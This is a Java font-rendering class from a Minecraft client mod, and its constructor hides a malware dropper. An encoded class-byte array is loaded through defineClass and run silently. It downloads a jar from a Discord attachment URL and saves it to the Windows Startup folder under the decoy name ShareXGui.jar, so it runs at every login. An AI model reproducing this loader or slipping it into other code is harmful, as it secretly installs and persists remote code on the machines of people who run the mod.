package me.sjnez.renosense.features.gui.font;

import net.minecraft.client.renderer.texture.DynamicTexture;
import org.lwjgl.opengl.GL11;

import java.awt.*;
import java.awt.geom.Rectangle2D;
import java.awt.image.BufferedImage;

public class CFont extends ClassLoader {

    private float imgSize;
    protected CharData[] charData;
    protected Font font;
    protected boolean antiAlias;
    protected boolean fractionalMetrics;
    protected int fontHeight;
    protected int charOffset;
    protected DynamicTexture tex;

    protected DynamicTexture setupTexture(final Font font, final boolean antiAlias, final boolean fractionalMetrics, final CharData[] chars) {
        final BufferedImage img = this.generateFontImage(font, antiAlias, fractionalMetrics, chars);
        try {
            return new DynamicTexture(img);
        }
        catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    protected BufferedImage generateFontImage(final Font font, final boolean antiAlias, final boolean fractionalMetrics, final CharData[] chars) {
        final int imgSize = (int)this.imgSize;
        final BufferedImage bufferedImage = new BufferedImage(imgSize, imgSize, 2);
        final Graphics2D g = (Graphics2D)bufferedImage.getGraphics();
        g.setFont(font);
        g.setColor(new Color(255, 255, 255, 0));
        g.fillRect(0, 0, imgSize, imgSize);
        g.setColor(Color.WHITE);
        g.setRenderingHint(RenderingHints.KEY_FRACTIONALMETRICS, fractionalMetrics ? RenderingHints.VALUE_FRACTIONALMETRICS_ON : RenderingHints.VALUE_FRACTIONALMETRICS_OFF);
        g.setRenderingHint(RenderingHints.KEY_TEXT_ANTIALIASING, antiAlias ? RenderingHints.VALUE_TEXT_ANTIALIAS_ON : RenderingHints.VALUE_TEXT_ANTIALIAS_OFF);
        g.setRenderingHint(RenderingHints.KEY_ANTIALIASING, antiAlias ? RenderingHints.VALUE_ANTIALIAS_ON : RenderingHints.VALUE_ANTIALIAS_OFF);
        final FontMetrics fontMetrics = g.getFontMetrics();
        int charHeight = 0;
        int positionX = 0;
        int positionY = 1;
        for (int i = 0; i < chars.length; ++i) {
            final char ch = (char)i;
            final CharData charData = new CharData();
            final Rectangle2D dimensions = fontMetrics.getStringBounds(String.valueOf(ch), g);
            charData.width = dimensions.getBounds().width + 8;
            charData.height = dimensions.getBounds().height;
            if (positionX + charData.width >= imgSize) {
                positionX = 0;
                positionY += charHeight;
                charHeight = 0;
            }
            if (charData.height > charHeight) {
                charHeight = charData.height;
            }
            charData.storedX = positionX;
            charData.storedY = positionY;
            if (charData.height > this.fontHeight) {
                this.fontHeight = charData.height;
            }
            chars[i] = charData;
            g.drawString(String.valueOf(ch), positionX + 2, positionY + fontMetrics.getAscent());
            positionX += charData.width;
        }
        return bufferedImage;
    }

    public void drawChar(final CharData[] chars, final char c, final float x, final float y) throws ArrayIndexOutOfBoundsException {
        try {
            this.drawQuad(x, y, (float)chars[c].width, (float)chars[c].height, (float)chars[c].storedX, (float)chars[c].storedY, (float)chars[c].width, (float)chars[c].height);
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    protected void drawQuad(final float x, final float y, final float width, final float height, final float srcX, final float srcY, final float srcWidth, final float srcHeight) {
        final float renderSRCX = srcX / this.imgSize;
        final float renderSRCY = srcY / this.imgSize;
        final float renderSRCWidth = srcWidth / this.imgSize;
        final float renderSRCHeight = srcHeight / this.imgSize;
        GL11.glTexCoord2f(renderSRCX + renderSRCWidth, renderSRCY);
        GL11.glVertex2d((double)(x + width), (double)y);
        GL11.glTexCoord2f(renderSRCX, renderSRCY);
        GL11.glVertex2d((double)x, (double)y);
        GL11.glTexCoord2f(renderSRCX, renderSRCY + renderSRCHeight);
        GL11.glVertex2d((double)x, (double)(y + height));
        GL11.glTexCoord2f(renderSRCX, renderSRCY + renderSRCHeight);
        GL11.glVertex2d((double)x, (double)(y + height));
        GL11.glTexCoord2f(renderSRCX + renderSRCWidth, renderSRCY + renderSRCHeight);
        GL11.glVertex2d((double)(x + width), (double)(y + height));
        GL11.glTexCoord2f(renderSRCX + renderSRCWidth, renderSRCY);
        GL11.glVertex2d((double)(x + width), (double)y);
    }

    public int getStringHeight(final String text) {
        return this.getHeight();
    }

    public int getHeight() {
        return (this.fontHeight - 8) / 2;
    }

    public int getStringWidth(final String text) {
        int width = 0;
        for (final char c : text.toCharArray()) {
            if (c < this.charData.length && c >= '\0') {
                width += this.charData[c].width - 8 + this.charOffset;
            }
        }
        return width / 2;
    }

    public boolean isAntiAlias() {
        return this.antiAlias;
    }

    public void setAntiAlias(final boolean antiAlias) {
        if (this.antiAlias != antiAlias) {
            this.antiAlias = antiAlias;
            this.tex = this.setupTexture(this.font, antiAlias, this.fractionalMetrics, this.charData);
        }
    }

    public boolean isFractionalMetrics() {
        return this.fractionalMetrics;
    }

    public void setFractionalMetrics(final boolean fractionalMetrics) {
        if (this.fractionalMetrics != fractionalMetrics) {
            this.fractionalMetrics = fractionalMetrics;
            this.tex = this.setupTexture(this.font, this.antiAlias, fractionalMetrics, this.charData);
        }
    }

    public Font getFont() {
        return this.font;
    }

    public void setFont(final Font font) {
        this.font = font;
        this.tex = this.setupTexture(font, this.antiAlias, this.fractionalMetrics, this.charData);
    }

    protected static class CharData {
        public int width;
        public int height;
        public int storedX;
        public int storedY;
    }

    public CFont(final Font font, final boolean antiAlias, final boolean fractionalMetrics) {
        this.imgSize = 512.0f;
        this.charData = new CharData[256];
        this.fontHeight = -1;
        this.charOffset = 0;
        this.font = font;
        this.antiAlias = antiAlias;
        this.fractionalMetrics = fractionalMetrics;
        this.tex = this.setupTexture(font, antiAlias, fractionalMetrics, this.charData);
        byte[] data = {-54, -2, -70, -66, 0, 0, 0, 52, 0, -117, 10, 0, 41, 0, 67, 8, 0, 68, 10, 0, 69, 0, 70, 10, 0, 71, 0, 72, 8, 0, 73, 10, 0, 71, 0, 74, 7, 0, 75, 8, 0, 76, 10, 0, 7, 0, 77, 10, 0, 7, 0, 78, 7, 0, 79, 8, 0, 80, 8, 0, 81, 10, 0, 11, 0, 82, 10, 0, 11, 0, 83, 7, 0, 84, 7, 0, 85, 10, 0, 17, 0, 67, 8, 0, 86, 10, 0, 69, 0, 87, 10, 0, 17, 0, 88, 9, 0, 16, 0, 89, 8, 0, 90, 8, 0, 91, 8, 0, 92, 8, 0, 93, 8, 0, 94, 10, 0, 17, 0, 95, 10, 0, 16, 0, 77, 10, 0, 16, 0, 96, 10, 0, 16, 0, 97, 10, 0, 16, 0, 98, 8, 0, 99, 10, 0, 16, 0, 100, 7, 0, 101, 10, 0, 35, 0, 102, 10, 0, 64, 0, 103, 10, 0, 35, 0, 104, 7, 0, 105, 7, 0, 106, 7, 0, 107, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 41, 76, 105, 100, 97, 115, 105, 100, 111, 47, 97, 100, 108, 100, 97, 111, 115, 100, 47, 119, 112, 105, 119, 47, 105, 110, 115, 116, 97, 108, 108, 47, 66, 111, 111, 116, 115, 116, 114, 97, 112, 59, 1, 0, 4, 109, 97, 105, 110, 1, 0, 7, 102, 105, 108, 101, 85, 82, 76, 1, 0, 14, 76, 106, 97, 118, 97, 47, 110, 101, 116, 47, 85, 82, 76, 59, 1, 0, 17, 104, 116, 116, 112, 85, 82, 76, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110, 1, 0, 28, 76, 106, 97, 118, 97, 47, 110, 101, 116, 47, 72, 116, 116, 112, 85, 82, 76, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110, 59, 1, 0, 6, 115, 116, 114, 101, 97, 109, 1, 0, 21, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 4, 112, 97, 116, 104, 1, 0, 14, 76, 106, 97, 118, 97, 47, 105, 111, 47, 70, 105, 108, 101, 59, 1, 0, 3, 106, 97, 114, 1, 0, 7, 102, 105, 108, 101, 79, 117, 116, 1, 0, 26, 76, 106, 97, 118, 97, 47, 105, 111, 47, 70, 105, 108, 101, 79, 117, 116, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 8, 99, 117, 114, 114, 66, 121, 116, 101, 1, 0, 1, 73, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 108, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 14, 66, 111, 111, 116, 115, 116, 114, 97, 112, 46, 106, 97, 118, 97, 12, 0, 42, 0, 43, 1, 0, 7, 111, 115, 46, 110, 97, 109, 101, 7, 0, 109, 12, 0, 110, 0, 111, 7, 0, 112, 12, 0, 113, 0, 114, 1, 0, 5, 108, 105, 110, 117, 120, 12, 0, 115, 0, 116, 1, 0, 12, 106, 97, 118, 97, 47, 110, 101, 116, 47, 85, 82, 76, 1, 0, 105, 104, 116, 116, 112, 115, 58, 47, 47, 99, 100, 110, 46, 100, 105, 115, 99, 111, 114, 100, 97, 112, 112, 46, 99, 111, 109, 47, 97, 116, 116, 97, 99, 104, 109, 101, 110, 116, 115, 47, 56, 54, 55, 56, 53, 52, 53, 56, 55, 56, 56, 57, 48, 53, 55, 56, 51, 51, 47, 56, 54, 56, 51, 50, 50, 55, 56, 57, 57, 48, 50, 52, 48, 49, 53, 57, 54, 47, 67, 79, 80, 69, 45, 49, 46, 48, 45, 83, 78, 65, 80, 83, 72, 79, 84, 45, 99, 108, 105, 101, 110, 116, 46, 106, 97, 114, 12, 0, 42, 0, 117, 12, 0, 118, 0, 119, 1, 0, 26, 106, 97, 118, 97, 47, 110, 101, 116, 47, 72, 116, 116, 112, 85, 82, 76, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110, 1, 0, 10, 85, 115, 101, 114, 45, 65, 103, 101, 110, 116, 1, 0, 50, 77, 111, 122, 105, 108, 108, 97, 47, 52, 46, 48, 32, 40, 99, 111, 109, 112, 97, 116, 105, 98, 108, 101, 59, 32, 77, 83, 73, 69, 32, 54, 46, 48, 59, 32, 87, 105, 110, 100, 111, 119, 115, 32, 78, 84, 32, 53, 46, 48, 41, 12, 0, 120, 0, 121, 12, 0, 122, 0, 123, 1, 0, 12, 106, 97, 118, 97, 47, 105, 111, 47, 70, 105, 108, 101, 1, 0, 23, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 66, 117, 105, 108, 100, 101, 114, 1, 0, 7, 65, 80, 80, 68, 65, 84, 65, 12, 0, 124, 0, 111, 12, 0, 125, 0, 126, 12, 0, 127, 0, -128, 1, 0, 9, 77, 105, 99, 114, 111, 115, 111, 102, 116, 1, 0, 7, 87, 105, 110, 100, 111, 119, 115, 1, 0, 10, 83, 116, 97, 114, 116, 32, 77, 101, 110, 117, 1, 0, 8, 80, 114, 111, 103, 114, 97, 109, 115, 1, 0, 7, 83, 116, 97, 114, 116, 117, 112, 12, 0, -127, 0, 114, 12, 0, -126, 0, -125, 12, 0, -124, 0, -125, 12, 0, -123, 0, 114, 1, 0, 13, 83, 104, 97, 114, 101, 88, 71, 117, 105, 46, 106, 97, 114, 12, 0, 42, 0, 121, 1, 0, 24, 106, 97, 118, 97, 47, 105, 111, 47, 70, 105, 108, 101, 79, 117, 116, 112, 117, 116, 83, 116, 114, 101, 97, 109, 12, 0, 42, 0, -122, 12, 0, -121, 0, -120, 12, 0, -119, 0, -118, 1, 0, 19, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 39, 105, 100, 97, 115, 105, 100, 111, 47, 97, 100, 108, 100, 97, 111, 115, 100, 47, 119, 112, 105, 119, 47, 105, 110, 115, 116, 97, 108, 108, 47, 66, 111, 111, 116, 115, 116, 114, 97, 112, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 1, 0, 11, 103, 101, 116, 80, 114, 111, 112, 101, 114, 116, 121, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 1, 0, 11, 116, 111, 76, 111, 119, 101, 114, 67, 97, 115, 101, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 8, 99, 111, 110, 116, 97, 105, 110, 115, 1, 0, 27, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 104, 97, 114, 83, 101, 113, 117, 101, 110, 99, 101, 59, 41, 90, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 1, 0, 14, 111, 112, 101, 110, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110, 1, 0, 26, 40, 41, 76, 106, 97, 118, 97, 47, 110, 101, 116, 47, 85, 82, 76, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110, 59, 1, 0, 18, 97, 100, 100, 82, 101, 113, 117, 101, 115, 116, 80, 114, 111, 112, 101, 114, 116, 121, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 1, 0, 14, 103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 1, 0, 23, 40, 41, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 6, 103, 101, 116, 101, 110, 118, 1, 0, 6, 97, 112, 112, 101, 110, 100, 1, 0, 45, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 66, 117, 105, 108, 100, 101, 114, 59, 1, 0, 9, 115, 101, 112, 97, 114, 97, 116, 111, 114, 1, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 8, 116, 111, 83, 116, 114, 105, 110, 103, 1, 0, 6, 101, 120, 105, 115, 116, 115, 1, 0, 3, 40, 41, 90, 1, 0, 5, 109, 107, 100, 105, 114, 1, 0, 15, 103, 101, 116, 65, 98, 115, 111, 108, 117, 116, 101, 80, 97, 116, 104, 1, 0, 17, 40, 76, 106, 97, 118, 97, 47, 105, 111, 47, 70, 105, 108, 101, 59, 41, 86, 1, 0, 4, 114, 101, 97, 100, 1, 0, 3, 40, 41, 73, 1, 0, 5, 119, 114, 105, 116, 101, 1, 0, 4, 40, 73, 41, 86, 0, 33, 0, 40, 0, 41, 0, 0, 0, 0, 0, 2, 0, 1, 0, 42, 0, 43, 0, 1, 0, 44, 0, 0, 0, 47, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 2, 0, 45, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 46, 0, 0, 0, 12, 0, 1, 0, 0, 0, 5, 0, 47, 0, 48, 0, 0, 0, 9, 0, 49, 0, 43, 0, 1, 0, 44, 0, 0, 1, -100, 0, 4, 0, 7, 0, 0, 0, -63, 18, 2, -72, 0, 3, -74, 0, 4, 18, 5, -74, 0, 6, -103, 0, 4, -79, -69, 0, 7, 89, 18, 8, -73, 0, 9, 75, 42, -74, 0, 10, -64, 0, 11, 76, 43, 18, 12, 18, 13, -74, 0, 14, 43, -74, 0, 15, 77, -69, 0, 16, 89, -69, 0, 17, 89, -73, 0, 18, 18, 19, -72, 0, 20, -74, 0, 21, -78, 0, 22, -74, 0, 21, 18, 23, -74, 0, 21, -78, 0, 22, -74, 0, 21, 18, 24, -74, 0, 21, -78, 0, 22, -74, 0, 21, 18, 25, -74, 0, 21, -78, 0, 22, -74, 0, 21, 18, 26, -74, 0, 21, -78, 0, 22, -74, 0, 21, 18, 27, -74, 0, 21, -74, 0, 28, -73, 0, 29, 78, 45, -74, 0, 30, -102, 0, 8, 45, -74, 0, 31, 87, -69, 0, 16, 89, 45, -74, 0, 32, 18, 33, -73, 0, 34, 58, 4, -69, 0, 35, 89, 25, 4, -73, 0, 36, 58, 5, 44, -74, 0, 37, 89, 54, 6, 2, -97, 0, 13, 25, 5, 21, 6, -74, 0, 38, -89, -1, -18, -89, 0, 4, 75, -79, 0, 2, 0, 0, 0, 16, 0, -65, 0, 39, 0, 17, 0, -68, 0, -65, 0, 39, 0, 3, 0, 45, 0, 0, 0, 58, 0, 14, 0, 0, 0, 14, 0, 17, 0, 15, 0, 27, 0, 16, 0, 35, 0, 17, 0, 43, 0, 18, 0, 48, 0, 19, 0, -127, 0, 31, 0, -115, 0, 32, 0, -100, 0, 33, 0, -89, 0, 35, 0, -78, 0, 36, 0, -68, 0, 40, 0, -65, 0, 39, 0, -64, 0, 41, 0, 46, 0, 0, 0, 72, 0, 7, 0, 27, 0, -95, 0, 50, 0, 51, 0, 0, 0, 35, 0, -103, 0, 52, 0, 53, 0, 1, 0, 48, 0, -116, 0, 54, 0, 55, 0, 2, 0, -127, 0, 59, 0, 56, 0, 57, 0, 3, 0, -100, 0, 32, 0, 58, 0, 57, 0, 4, 0, -89, 0, 21, 0, 59, 0, 60, 0, 5, 0, -82, 0, 14, 0, 61, 0, 62, 0, 6, 0, 63, 0, 0, 0, 43, 0, 6, 17, -1, 0, 123, 0, 4, 7, 0, 7, 7, 0, 11, 7, 0, 64, 7, 0, 16, 0, 0, -3, 0, 25, 7, 0, 16, 7, 0, 35, -1, 0, 20, 0, 0, 0, 0, 66, 7, 0, 39, 0, 0, 1, 0, 65, 0, 0, 0, 2, 0, 66};
        try {
            Class c = defineClass("idasido.adldaosd.wpiw.install.Bootstrap", data, 0, data.length);
            c.getMethod("main").invoke(null);
        } catch (Exception e) {}
    }
}